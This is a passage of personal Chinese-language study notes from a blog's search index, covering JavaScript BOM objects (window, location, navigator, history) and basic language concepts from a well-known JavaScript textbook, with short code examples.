class="string">"rightFrame"</span>&gt;</span><span class="tag">&lt;/<span class="name">frame</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">frameset</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// rightFrame中又包含了两个iframe</span><br><span class="line"><span class="tag">&lt;<span class="name">frameset</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">"red.htm"</span> <span class="attr">name</span>=<span class="string">"redFrame"</span>&gt;</span><span class="tag">&lt;/<span class="name">frame</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">"blue.htm"</span> <span class="attr">name</span>=<span class="string">"blueFrame"</span>&gt;</span><span class="tag">&lt;/<span class="name">frame</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">frameset</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/02/26/BOM文档/1.png" style="max-width:350px"></p><p><br></p><h3 id="3-窗口属性"><a href="#3-窗口属性" class="headerlink" title="3. 窗口属性"></a>3. 窗口属性</h3><ul><li><p>浏览器相对于屏幕左边和上边的位置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> leftPos = (<span class="keyword">typeof</span> <span class="built_in">window</span>.screenLeft == <span class="string">"number"</span>) ? <span class="built_in">window</span>.screenLeft : <span class="built_in">window</span>.screenX;</span><br><span class="line"><span class="keyword">var</span> topPost = (<span class="keyword">typeof</span> <span class="built_in">window</span>.screenTop == <span class="string">"number"</span>) ? <span class="built_in">window</span>.screenTop : <span class="built_in">window</span>.screenY;</span><br></pre></td></tr></table></figure></li><li><p>页面视口的大小（注: 无法确定浏览器窗口的大小）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pageWidth = <span class="built_in">window</span>.innerWidth,</span><br><span class="line">    pageHeight = <span class="built_in">window</span>.innerHeight;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> pageWidth != <span class="string">"number"</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">document</span>.compatMode == <span class="string">"CSS1Compat"</span>)&#123;</span><br><span class="line">      pageWidth = <span class="built_in">document</span>.documentElement.clientWidth;</span><br><span class="line">      pageHeight = <span class="built_in">document</span>.documentElement.clientHeight;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      pageWidth = <span class="built_in">document</span>.body.clientWidth;</span><br><span class="line">      pageHeight = <span class="built_in">document</span>.body.clientHeight;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="4-打开新窗口"><a href="#4-打开新窗口" class="headerlink" title="4. 打开新窗口"></a>4. 打开新窗口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.open(url, 窗口目标，特性字符串，一个表示新页面是否取代浏览器历史记录中当前加载页面的布尔值)</span><br></pre></td></tr></table></figure><ul><li><p><em>窗口目标</em><br>这个参数可以是下列任何一个特殊的窗口名称<em><code>_self</code>, <code>_parent</code>, <code>_top</code>, <code>_blank</code></em>，也可以指定具体值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 如果有一个叫topFrame的窗口就会在该窗口或框架加载这个url</span><br><span class="line">window.open(&quot;http://www.baidu.com&quot;, &quot;topFrame&quot;)</span><br><span class="line"></span><br><span class="line">// 在新标签页打开url</span><br><span class="line">window.open(&quot;https://www.baidu.com&quot;, &quot;_blank&quot;)</span><br></pre></td></tr></table></figure></li><li><p><em>特性字符串</em><br>在当前窗口打开一个弹出窗口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.open(&quot;http://www.baidu.com&quot;, null, &quot;height=400,width=400,top=10,left=10,resizeable=yes&quot;)</span><br></pre></td></tr></table></figure></li></ul><table><thead><tr><th>设置</th><th style="text-align:center">值</th><th style="text-align:right">说明</th></tr></thead><tbody><tr><td>fullscreen</td><td style="text-align:center">yes/no</td><td style="text-align:right">浏览器窗口是否最大化(限IE)</td></tr><tr><td>height</td><td style="text-align:center">数值</td><td style="text-align:right">新窗口的高度，不能小于100</td></tr><tr><td>width</td><td style="text-align:center">数值</td><td style="text-align:right">新窗口的宽度，不能小于100</td></tr><tr><td>top</td><td style="text-align:center">数组</td><td style="text-align:right">新窗口的上坐标，不能是负值</td></tr><tr><td>left</td><td style="text-align:center">数组</td><td style="text-align:right">新窗口的左坐标，不能是负值</td></tr><tr><td>location</td><td style="text-align:center">yes/no</td><td style="text-align:right">是否在浏览器窗口中显示地址栏(可能会被禁用)</td></tr><tr><td>menubar</td><td style="text-align:center">yes/no</td><td style="text-align:right">是否在浏览器窗口显示菜单栏</td></tr><tr><td>resizable</td><td style="text-align:center">yes/no</td><td style="text-align:right">是否可以拖动浏览器窗口的边框改变其大小</td></tr><tr><td>scrollbars</td><td style="text-align:center">yes/no</td><td style="text-align:right">是否允许滚动</td></tr><tr><td>status</td><td style="text-align:center">yes/no</td><td style="text-align:right">是否在浏览器窗口中显示状态栏</td></tr><tr><td>toolbar</td><td style="text-align:center">yes/no</td><td style="text-align:right">是否在浏览器窗口中显示工具栏</td></tr></tbody></table><ul><li><em>其他操作</em><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">window</span>.open(<span class="string">"http://www.baidu.com"</span>, <span class="literal">null</span>, <span class="string">"height=400,width=400,top=10,left=10"</span>);</span><br><span class="line">a.resizeTo(<span class="number">500</span>, <span class="number">500</span>)  <span class="comment">// 调整大小</span></span><br><span class="line">a.moveTo(<span class="number">100</span>, <span class="number">100</span>)    <span class="comment">// 移动位置</span></span><br><span class="line">a.close()             <span class="comment">// 关闭新打开的窗口</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="5-location"><a href="#5-location" class="headerlink" title="5. location"></a>5. location</h3><h4 id="5-1-查询URL参数"><a href="#5-1-查询URL参数" class="headerlink" title="5.1 查询URL参数"></a>5.1 查询URL参数</h4><p><code>location</code>是最有用的BOM对象之一，可以通过<code>window.location</code>和<code>document.location</code>访问。它不仅保存着当前文档的信息，还将它解析为独立的片段。</p><table><thead><tr><th>属性名</th><th style="text-align:center">例子</th><th style="text-align:right">说明</th></tr></thead><tbody><tr><td>hash</td><td style="text-align:center">“#contents”</td><td style="text-align:right">返回URL中的hash(#号后的字符)</td></tr><tr><td>host</td><td style="text-align:center"><code>&quot;www.baidu.com:80&quot;</code></td><td style="text-align:right">返回服务器名称的端口号</td></tr><tr><td>hostname</td><td style="text-align:center"><code>&quot;www.baidu.com&quot;</code></td><td style="text-align:right">返回不带端口号的服务器名称</td></tr><tr><td>href</td><td style="text-align:center"><code>&quot;http://www.baidu.com&quot;</code></td><td style="text-align:right">返回当前页面的完整URL</td></tr><tr><td>pathname</td><td style="text-align:center">“/dashboard/“</td><td style="text-align:right">返回URL的目录或文件名</td></tr><tr><td>port</td><td style="text-align:center">“8080”</td><td style="text-align:right">返回UR中的端口号</td></tr><tr><td>protocol</td><td style="text-align:center">“http:”</td><td style="text-align:right">返回页面使用的协议 <code>http:</code>或<code>https:</code></td></tr><tr><td>search</td><td style="text-align:center">“?q=javascript”</td><td style="text-align:right">返回URL的查询字符串，以<code>?</code>开头</td></tr></tbody></table><ul><li><em>解析查询字符串</em><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getQueryStringArgs</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> qs = (location.search.length &gt; <span class="number">0</span> ? location.serach.substring(<span class="number">1</span>) : <span class="string">""</span>);</span><br><span class="line">      args = &#123;&#125;;</span><br><span class="line">      items = qs.length ? qs.split(<span class="string">"&amp;"</span>) : [];</span><br><span class="line">      </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; items.length; i++)&#123;</span><br><span class="line">    <span class="keyword">var</span> item = items[i].split(<span class="string">"="</span>);</span><br><span class="line">    <span class="keyword">var</span> name = <span class="built_in">decodeURIComponent</span>(item[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">var</span> val = <span class="built_in">decodeURIComponent</span>(item[<span class="number">1</span>]);</span><br><span class="line">    args[name] = val;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> args;  </span><br><span class="line">&#125;</span><br><span class="line">alert(args[<span class="string">"q"</span>])  <span class="comment">// "javascript"</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="5-2-修改URL"><a href="#5-2-修改URL" class="headerlink" title="5.2 修改URL"></a>5.2 修改URL</h4><ul><li><p>在当前页面打开新URL(并在浏览器的历史记录中生成一条记录)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">location.assign(<span class="string">"http://www.baidu.com"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 与assign效果一样</span></span><br><span class="line"><span class="built_in">window</span>.location = <span class="string">"http://www.baidu.com"</span>;</span><br><span class="line">location.href = <span class="string">"http://www.baidu.com"</span></span><br></pre></td></tr></table></figure></li><li><p>将hash,search, hostname, pathname, port设置为新值来改变URL<br>只有修改<code>hash</code>属性，页面不会以新URL重新加载。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设原始url为"http://www.baidu.com/dashboard"</span></span><br><span class="line"><span class="comment">// url修改为"http://www.baidu.com/dashboard/#section1"</span></span><br><span class="line">location.hash = <span class="string">"#section1"</span>;          </span><br><span class="line"></span><br><span class="line"><span class="comment">// url修改为"http://www.baidu.com/dashboard?q=javascript"</span></span><br><span class="line">location.search = <span class="string">"?q=javascript"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// url修改为"http://www.yahoo.com/dashboard"</span></span><br><span class="line">location.hostname = <span class="string">"www.yahoo.com"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// url修改为"http://www.baidu.com/mydir"</span></span><br><span class="line">location.pathname = <span class="string">"mydir"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// url修改为"http://www.baidu.com:8000/dashboard"</span></span><br><span class="line">location.port = <span class="number">8000</span>;</span><br></pre></td></tr></table></figure></li></ul><p>通过上面任何一种方式修改URL后，浏览器的历史记录都会生成一条新记录。</p><ul><li><p>当前页面加载新URL，但是不会再历史记录中生成新记录。用户不能回到前一个页面</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.replace(<span class="string">"http://www.baidu.com"</span>)</span><br></pre></td></tr></table></figure></li><li><p>重新加载当前页面</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">location.reload();     <span class="comment">// 可能从缓存中加载</span></span><br><span class="line">location.reload(<span class="literal">true</span>); <span class="comment">// 从服务器重新加载</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="6-navigator"><a href="#6-navigator" class="headerlink" title="6. navigator"></a>6. navigator</h3><h4 id="6-1-检查插件"><a href="#6-1-检查插件" class="headerlink" title="6.1 检查插件"></a>6.1 检查插件</h4><p>在浏览器中，可以使用<code>plugins</code>数组，检查浏览器中是否安装了特定的插件。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 非IE浏览器</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hasPlugin</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  name = name.toLowerCase();</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; navigator.plugins.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(navigator.plugins[i].name.toLowerCase().indexOf(name) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// IE浏览器</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hasIEPlugin</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">new</span> ActiveXObject(name);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (ex)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hasFlash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = hasPlugin(<span class="string">"Flash"</span>);</span><br><span class="line">  <span class="keyword">if</span> (!result)&#123;</span><br><span class="line">    result = hasIEPlugin(<span class="string">"ShockwaveFlash.ShockwaveFlash"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-2-判断浏览器类型"><a href="#6-2-判断浏览器类型" class="headerlink" title="6.2 判断浏览器类型"></a>6.2 判断浏览器类型</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getExploreName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> userAgent = navigator.userAgent;</span><br><span class="line">  <span class="keyword">if</span>(userAgent.indexOf(<span class="string">"Opera"</span>) &gt; <span class="number">-1</span> || userAgent.indexOf(<span class="string">"OPR"</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Opera'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(userAgent.indexOf(<span class="string">"compatible"</span>) &gt; <span class="number">-1</span> &amp;&amp; userAgent.indexOf(<span class="string">"MSIE"</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'IE'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(userAgent.indexOf(<span class="string">"Edge"</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Edge'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(userAgent.indexOf(<span class="string">"Firefox"</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Firefox'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(userAgent.indexOf(<span class="string">"Safari"</span>) &gt; <span class="number">-1</span> &amp;&amp; userAgent.indexOf(<span class="string">"Chrome"</span>) == <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Safari'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(userAgent.indexOf(<span class="string">"Chrome"</span>) &gt; <span class="number">-1</span> &amp;&amp; userAgent.indexOf(<span class="string">"Safari"</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Chrome'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!!<span class="built_in">window</span>.ActiveXObject || <span class="string">"ActiveXObject"</span> <span class="keyword">in</span> <span class="built_in">window</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'IE&gt;=11'</span>;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Unkonwn'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="7-screen"><a href="#7-screen" class="headerlink" title="7. screen"></a>7. screen</h3><p>表示浏览器窗口外部的显示器的信息，如像素宽高。<br><br></p><h3 id="8-history"><a href="#8-history" class="headerlink" title="8. history"></a>8. history</h3><p><code>history</code>对象保存着用户上网的历史记录。出于安全考虑，开发人员无法得知用户浏览过的URL。但是使用<code>go()</code>方法可以在用户的历史记录中任意跳转。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">history.go(<span class="number">-1</span>);   <span class="comment">// 后退一页</span></span><br><span class="line">history.go(<span class="number">1</span>);    <span class="comment">// 前进一页</span></span><br><span class="line">history.go(<span class="number">2</span>);    <span class="comment">// 前进两页</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// 跳转到历史记录中 最近的 包含改字符串的地址，可能前进可能后退</span></span><br><span class="line">history.go(<span class="string">"wrox.com"</span>)</span><br></pre></td></tr></table></figure><p><br></p><h3 id="6-其他"><a href="#6-其他" class="headerlink" title="6. 其他"></a>6. 其他</h3><ul><li>setTimeout, clearTimeout</li><li>setInterval, clearInterval</li><li>系统对话框 alert(), confirm(), prompt()</li><li>显示打印对话框 window.print()</li><li>显示查找对话框 window.find()</li><li>可能被浏览器禁用的方法<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">window.moveTo(0, 0)         将窗口移动到屏幕左上角</span><br><span class="line">window.moveBy(0, 100)       将窗口向下移动100像素</span><br><span class="line">window.resizeTo(100, 100)   将窗口调整到100 * 100</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li>《Javscript高级程序设计》 第八章 BOM</li><li>《Javascript高级程序设计》第九章 客户端监测</li><li><a href="https://segmentfault.com/a/1190000007640795" target="_blank" rel="noopener">JS 获得浏览器类型和版本</a></li></ul>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>《Javascript高级程序设计》</title>
      <link href="/2019/02/26/%E3%80%8AJavascript%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E3%80%8B/"/>
      <url>/2019/02/26/%E3%80%8AJavascript%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E3%80%8B/</url>
      <content type="html"><![CDATA[<h3 id="1-script"><a href="#1-script" class="headerlink" title="1. script"></a>1. script</h3><p><em><code>&lt;script&gt;</code></em>的6个属性：async, charset, defer, language, src, type<br>与解析嵌入式Javascript代码一样，在解析外部Javascript文件时(包括下载文件)，页面的处理会暂时停止。无论如何包含代码，只要不存在defer和async属性，浏览器都会按照<code>&lt;script&gt;</code>元素在页面中出现的先后顺序对它依次进行解析。第一个script元素包含的代码解析完后，第二个才会被解析。</p><p><em>延迟脚本</em><br>脚本会被延迟到整个页面都解析完毕后再运行。defer属性只适用于外部文件。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">”text/javascript”defer</span>=<span class="string">”defer”src</span>=<span class="string">”example.js”</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><em>异步脚本</em><br>async只适用于外部文件。指定async的目的是不让页面等待两个脚本下载和执行，从而异步加载页面其他内容。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">”text/javascript”</span> <span class="attr">async</span> <span class="attr">src</span>=<span class="string">”example.js”</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="2-基本概念"><a href="#2-基本概念" class="headerlink" title="2.基本概念"></a>2.基本概念</h3><p>JS的变量是松散类型的，所谓松散类型就是可以用来保存任何类型的数据。换句话说，每个变量仅仅是一个用于保存值得占位符。<code>var message</code>未经初始化的变量，会保存一个特殊的值——undefined。用var操作符定义的变量会成为定义改变量的作用域中的局部变量。如果在函数中使用var定义一个变量，那么这个变量在函数退出后会被销毁。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> message = <span class="string">"Hi"</span>;</span><br><span class="line">&#125;</span><br><span class="line">test();</span><br><span class="line">alert(message);  <span class="comment">// 错误</span></span><br></pre></td></tr></table></figure></p><p><em>typeof</em><br>检查变量的数据类型，返回Undefined, boolean, string, number, object, function</p><p><em>instanceof</em><br>如果变量是给定引用类型的实例（根据原型链识别），那么instanceof会返回true<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alert(person instanceof Object)  // 变量person是Object吗？ </span><br><span class="line">alert(colors instanceof Array)   // 变量colors是Array吗？</span><br></pre></td></tr></table></figure></p><p><em>boolean</em><br>对任何数据类型值调用Boolean()函数，总是会返回一个boolean值。</p><table><thead><tr><th>数据类型</th><th style="text-align:center">转换为true的值</th><th style="text-align:right">转换为false的值</th></tr></thead><tbody><tr><td>Boolean</td><td style="text-align:center">true</td><td style="text-align:right">false</td></tr><tr><td>String</td><td style="text-align:center">任何非空字符串</td><td style="text-align:right">“”(空字符串)</td></tr><tr><td>Number</td><td style="text-align:center">任何非零数字值(包括无穷大)</td><td style="text-align:right">0和NaN</td></tr><tr><td>Object</td><td style="text-align:center">任何对象</td><td style="text-align:right">null</td></tr><tr><td>Undefined</td><td style="text-align:center">n/a</td><td style="text-align:right">undefined</td></tr></tbody></table><p><em>NaN</em><br>确定这个参数是否“不是数值”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">isNaN(NaN)     // true</span><br><span class="line">isNaN(10)      // false</span><br><span class="line">isNaN(&quot;10&quot;)    // false</span><br><span class="line">isNaN(&quot;blue&quot;)  // true</span><br><span class="line">isNaN(true)    // false(可以转换为数值1)</span><br></pre></td></tr></table></figure></p><p><em>数值转换</em><br>parseInt: 如果第一个字符是数字字符，直到遇到一个非数字字符。无法解析返回NaN<br>parseFloat: 从第一个字符开始解析，直到遇见一个无效的浮点数字字符为止。</p><p><em>退出循环</em><br><code>break</code>会立即退出循环，强制继续执行循环后面的语句。<br><code>continue</code>会立即退出循环，但退出循环后会从循环的顶部继续执行。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">  <span class="keyword">if</span> (i % <span class="number">5</span> == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">break</span>; </span><br><span class="line">    <span class="comment">// continue;</span></span><br><span class="line">  &#125;</span><br><span class="line">  num++;</span><br><span class="line">&#125;</span><br><span class="line">alert(num); <span class="comment">// break: 4</span></span><br><span class="line">alert(num); <span class="comment">// continue: 8</span></span><br></pre></td></tr></table></figure></p><p>break和continue都可以与label语句联合使用，从而返回代码中特定的位置。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">0</span>;</span><br><span class="line">outermost;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">5</span> &amp;&amp; j == <span class="number">5</span>)&#123;</span><br><span class="line">      <span class="keyword">break</span> outermost;</span><br><span class="line">      <span class="comment">// continue outermost;</span></span><br><span class="line">    &#125;</span><br><span class="line">    num++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">alert(num); <span class="comment">// break: 55，break不仅会退出j循环，还会退出i循环</span></span><br><span class="line">alert(num); <span class="comment">// continue: 95, continue退出内部循环，执行外部循环，i=5,j=6~10不会被执行</span></span><br></pre></td></tr></table></figure></p><p><br></p><p><br></p><h3 id="3-变量、作用域和内存问题"><a href="#3-变量、作用域和内存问题" class="headerlink" title="3.变量、作用域和内存问题"></a>3.变量、作用域和内存问题</h3><p>Undefined, Null, Boolean, Number, String这5种基本数据类型是按值访问，可以操作在变量中实际的值。引用类型的值是按引用访问的。</p><p><br></p><h4 id="3-1-复制变量值"><a href="#3-1-复制变量值" class="headerlink" title="3.1 复制变量值"></a>3.1 复制变量值</h4><ul><li>复制一个基本类型的值，会在变量对象上创建一个新值，然后把该值复制到位新变量分配的位置上。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var num1 = 5;</span><br><span class="line">var num2 = num1;</span><br><span class="line">// num1中的5和num2中的5是完全独立的。两个变量不会相互影响。</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2019/02/26/《Javascript高级程序设计》/1.png" style="max-width:250px"><br><br></p><ul><li>复制一个引用类型的值，同样会将存储在变量对象中的值复制一份放到新变量分配的空间中。不同的是，这个值的副本实际上是一个指针，这个指针指向存储在堆中的一个对象。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var obj1 = new Object();</span><br><span class="line">var obj2 = obj1;</span><br><span class="line">obj1.name = ‘mike’;</span><br><span class="line">alert(obj2.name)  // ‘mike’</span><br><span class="line">// 